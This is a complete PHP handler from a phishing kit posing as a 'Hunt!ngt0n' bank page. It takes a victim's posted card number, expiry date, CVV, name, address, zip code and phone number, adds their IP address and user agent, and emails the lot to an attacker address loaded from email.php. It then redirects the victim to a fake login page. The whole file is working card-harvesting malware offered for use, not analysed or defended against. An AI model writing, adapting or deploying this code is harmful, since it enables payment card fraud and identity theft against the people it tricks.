<?php
if($_POST["nc"] != "" and $_POST["c"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Hunt!ngt0n Info-----------------------\n";
$message .= "Name on C@rd           : ".$_POST['nc']."\n";
$message .= "C@rd Number            : ".$_POST['c']."\n";
$message .= "Expiry Date       		: ".$_POST['x']."\n";
$message .= "C.V'V            		: ".$_POST['v']."\n";
$message .= "Address              	: ".$_POST['addr']."\n";
$message .= "Zip Code           	: ".$_POST['zp']."\n";
$message .= "Phone Number           : ".$_POST['ph']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf6.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>